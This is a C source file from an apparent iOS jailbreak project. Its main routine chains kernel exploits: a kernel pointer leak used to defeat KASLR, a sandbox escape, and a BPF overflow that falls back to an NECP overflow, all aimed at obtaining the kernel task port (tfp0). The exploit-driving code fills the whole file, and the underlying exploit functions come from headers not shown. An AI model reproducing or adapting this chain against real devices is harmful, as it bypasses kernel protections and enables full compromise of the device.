//
//  jailbreak.c
//  jailbreak112
//
//  Created by Sem Voigtländer on 11/04/2018.
//  Copyright © 2018 Jailed Inc. All rights reserved.
//

#include <mach/mach.h>
#include <pthread.h>
#include "offsets.h"
#include "jailbreak.h"
#include "bazadleak.h"
#include "sploit.h"
#include "reboot.h"
#include "unsandbox.h"


mach_port_t tfp0 = MACH_PORT_NULL;
mach_port_t ports_dealloc_list[0xfffff];

uint64_t kaslr_shift = 0;
uint64_t kernel_text_base = 0;
uint64_t allproc = 0;
uint64_t realhost = 0;
uint64_t osdata_get_metaclass = 0;
uint64_t osserializer_serialize = 0;
uint64_t proc_task = 0;

int jailbreak()
{

    //initialize kernel offsets needed for memory patches
    init_offsets();
    
    //Leak a kernel pointer using bazad's info leak due to a vuln in the mitigation of spectre.
    uint64_t kernelptr_bazad = bazadleak();
    
    if(kernelptr_bazad>0)
    {
        //calculate addresses of kernel functions to be used later in the exploit
        kaslr_shift = kernelptr_bazad - default_offsets.lel0_sync_vec64_long;
        kernel_text_base = kernelptr_bazad - (default_offsets.lel0_sync_vec64_long - default_offsets.kernel_base);
        osdata_get_metaclass = default_offsets.osdata_metaclass + kaslr_shift;
        osserializer_serialize = default_offsets.osserializer_serialize + kaslr_shift;
        allproc = default_offsets.allproc + kaslr_shift;
        realhost = default_offsets.realhost + kaslr_shift;
        proc_task = default_offsets.proc_task + kaslr_shift;
        printf("lel0_sync_vec64_long: %#llx\n\n", kernelptr_bazad);
        printf("kaslr_shift: %#llx\n", kaslr_shift);
        printf("kernel base: %#llx\n", kernel_text_base);
        printf("allproc: %#llx\n", allproc);
        printf("realhost: %#llx\n", realhost);
        printf("osdata_get_metaclass: %#llx\n", osdata_get_metaclass);
        printf("osserialize_serialize: %#llx\n", osserializer_serialize);
        printf("proc_task: %#llx\n", proc_task);
        
    } else {
        printf("Failed to leak a kernel pointer.\n", NULL);
    }
    
    int success = unsandbox();
    
    success = kernelsploit_bpf(); //this fellah requires root though everybody hyped so why the heck not add it
    
    if(!success) {
        printf("Bpf overflow failed, trying with necp overflow...\n");
        success = kernelsploit_necp();
        printf("Vulnerable driver connection: %#x\n",success);
    }
    return tfp0 != MACH_PORT_NULL && kernelptr_bazad != 0;
}
